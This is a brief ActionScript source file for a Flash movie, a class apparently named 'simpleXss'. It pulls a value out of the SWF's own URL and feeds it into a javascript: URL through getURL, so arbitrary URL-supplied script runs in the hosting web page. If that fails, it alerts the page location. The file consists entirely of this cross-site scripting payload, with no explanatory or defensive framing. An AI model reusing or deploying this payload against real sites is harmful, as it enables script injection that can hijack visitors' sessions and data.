class simpleXss {
 
 static function main(){
  var searchAndReplace =  function (holder, searchfor, replacement) {
	var temparray = holder.split(searchfor);
	holder = temparray.join(replacement);
	return (holder);
  }  
    var swfurl = unescape( _root._url);
    swfurl  =  swfurl.substr(swfurl.lastIndexOf("variable")+9,swfurl.length );
    swfurl  = swfurl.substr(0, swfurl.lastIndexOf("\""));
    getURL('javascript:try{ gotRoot ("'+swfurl+'")}catch(e){alert(document.location)}');
    
  }
}
